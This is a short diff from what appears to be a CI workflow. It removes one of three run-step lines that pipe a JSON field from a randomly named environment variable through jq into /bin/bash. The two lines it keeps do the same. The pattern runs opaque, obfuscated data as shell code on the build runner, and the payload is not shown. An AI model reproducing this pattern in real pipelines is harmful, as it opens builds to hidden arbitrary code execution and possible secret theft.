@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
           echo $kbld25 | jq -r .i7218 | /bin/bash
-          echo $czgv027 | jq -r .quq3 | /bin/bash
 
       - name: Save output
         if: always()
